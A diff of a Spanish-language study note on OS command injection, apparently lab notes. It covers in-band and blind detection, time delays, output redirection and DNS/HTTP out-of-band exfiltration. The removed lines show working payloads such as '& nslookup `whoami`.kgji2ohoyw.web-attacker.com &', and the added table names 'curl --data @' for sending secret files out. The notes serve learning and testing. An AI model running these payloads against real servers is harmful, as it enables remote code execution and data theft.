@@ -18,46 +18,37 @@ tags:
 > [!abstract] La idea en una línea
 > Una feature del server **arma un comando del sistema operativo con datos que vos controlás** (un ping, un `nslookup`, un conversor de imágenes, un mail…) y lo pasa a una **shell**. Si metés un **separador de comandos**, la shell ejecuta **tu** comando pegado al de la app → **RCE** con los privilegios del proceso web.
 
+## 📚 Referencias rápidas
+
+- 🐍 **Ejemplos / PoCs** (del más simple al más ciego, cada uno con su "por qué"):
+    - [[vulnerabilities/027-os-command-injection/examples/001-simple-in-band|001 · caso simple (in-band)]] · [[vulnerabilities/027-os-command-injection/examples/002-blind-time-delay|002 · ciego por time delay]]
+    - [[vulnerabilities/027-os-command-injection/examples/003-blind-output-redirection|003 · redirección de salida]] · [[vulnerabilities/027-os-command-injection/examples/004-blind-oob-interaction|004 · OOB por DNS]]
+    - Exfil: [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil|005 · OOB por DNS ⭐]] · [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006 · archivo entero (POST) ⭐]]
+- 🔗 **OAST/Collaborator:** mismo canal que el [[vulnerabilities/007-ssrf/ssrf|SSRF ciego]].
+
 ## 🎯 Cuándo hay command injection (condiciones)
 
 1. **Un input alimenta un comando del SO** — pistas clásicas: "check stock" con `storeID`, DNS/ping tools, feedback que manda mail (`mail -s`), thumbnails/PDF (`convert`, `wkhtmltopdf`), backups, `ping`/`nslookup`/`whois`.
 2. **La app usa una shell** (`system()`, `exec()` con shell, `os.system`, backticks de Perl/PHP…) → los **metacaracteres** de la shell se interpretan.
 3. **Tu dato no está saneado** (o el filtro es débil / escapea mal).
 
-## 🧪 Cómo detectarlo
+## 🧪 Cómo detectarlo (metodología)
 
-### Con output (in-band) — el fácil
+1. **Encontrá el input que alimenta un comando** — stock checker (`storeId`), formulario de feedback (`email`), tools de ping/DNS/whois, generadores de PDF/thumbnails.
+2. **¿La salida vuelve en la respuesta?** → **in-band**, RCE directo (001).
+3. **¿No ves nada?** → sos **ciego**: subí la escalera **en orden**, de más simple a más furtivo (002 → 005).
 
-Inyectás un **separador + comando** y **la salida vuelve en la respuesta**. Ej: en un `storeID=1` probás `1 & whoami &` y ves el usuario en la página. Si aparece → RCE directo.
+| Situación | Técnica | Ejemplo |
+| --- | --- | --- |
+| Ves la salida en la respuesta | separador + comando | [[vulnerabilities/027-os-command-injection/examples/001-simple-in-band\|001 · in-band]] |
+| No ves salida — confirmar que ejecuta | **time delay** (`ping`) | [[vulnerabilities/027-os-command-injection/examples/002-blind-time-delay\|002 · time delay]] |
+| Ejecuta, pero querés **leer** la salida (hay dir web escribible) | **redirección** a archivo | [[vulnerabilities/027-os-command-injection/examples/003-blind-output-redirection\|003 · redirección]] |
+| Sin dir escribible / HTTP saliente filtrado | **OAST** por DNS (confirmar) | [[vulnerabilities/027-os-command-injection/examples/004-blind-oob-interaction\|004 · OOB DNS]] |
+| Confirmado por DNS, querés un **dato corto** | **exfil** en el subdominio (inline) | [[vulnerabilities/027-os-command-injection/examples/005-blind-oob-exfil\|005 · OOB exfil]] |
+| El dato es un **archivo entero** (secreto/token) | **POST** del archivo por HTTP (`curl --data @` / `wget --post-file`) | [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo\|006 · archivo entero]] |
 
-### Blind (sin output) — la escalera
-
-Cuando la respuesta **no** te muestra la salida, subís esta escalera **en orden** (de más simple a más furtivo):
-
-> [!tip] Por qué el patrón `& … &`
-> El `&` de adelante **cierra** el comando original; tu comando corre; el `&` de atrás lo deja "cerrado" para que **lo que la app pegue después** (comillas, más argumentos) **no rompa** tu inyección. Es el equivalente al header "colador" del smuggling: dejás todo prolijo alrededor de lo tuyo.
-
-**1) Time delay — confirmar que ejecuta**
-Si no ves nada, hacé que **tarde**. Un `ping` con N paquetes = N segundos de demora medibles:
-```
-& ping -c 10 127.0.0.1 &
-```
-Respuesta que tarda ~10s → **ejecuta** (baseline: probá sin el ping para comparar). En Windows: `ping -n 10 127.0.0.1`.
-
-**2) Redirigir la salida a un dir web — leerla por HTTP**
-Si hay una carpeta servida estáticamente y **escribible**, mandás la salida ahí y la pedís con el browser:
-```
-& whoami > /var/www/static/whoami.txt &
-```
-Después abrís `/whoami.txt` y leés el resultado. Depende de conocer/adivinar un directorio web escribible.
-
-**3) OAST / exfil por DNS — cuando todo lo demás falla**
-Sin output, sin dir escribible y con **HTTP saliente filtrado**, casi siempre **el DNS sí sale**. Usás [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator):
-```
-& nslookup kgji2ohoyw.web-attacker.com &          # confirma ejecución (llega el DNS)
-& nslookup `whoami`.kgji2ohoyw.web-attacker.com & # EXFIL: mete la salida en el subdominio
-```
-En el Collaborator ves la query DNS `wwwuser.kgji2ohoyw…` → **exfiltraste `whoami`** dentro del hostname. (Truco: solo salen chars válidos de DNS; para salida con espacios/`/` usá inline + `base64`/`sed`.)
+> [!tip] Por qué se envuelve el payload (`x|| … ||` o `& … &`)
+> El separador de adelante **cierra** el comando original; tu comando corre; el de atrás deja todo "cerrado" para que **lo que la app pegue después** (comillas, más argumentos) **no rompa** tu inyección. Es el equivalente al header "colador" del smuggling: dejás prolijo alrededor de lo tuyo.
 
 > [!note] Mismo Collaborator que en SSRF
 > El OAST acá es idéntico al de [[vulnerabilities/007-ssrf/ssrf|SSRF ciego]]: no ves la respuesta, así que **hacés que el server te "llame" afuera**. DNS > HTTP porque el egress de DNS casi nunca está filtrado.
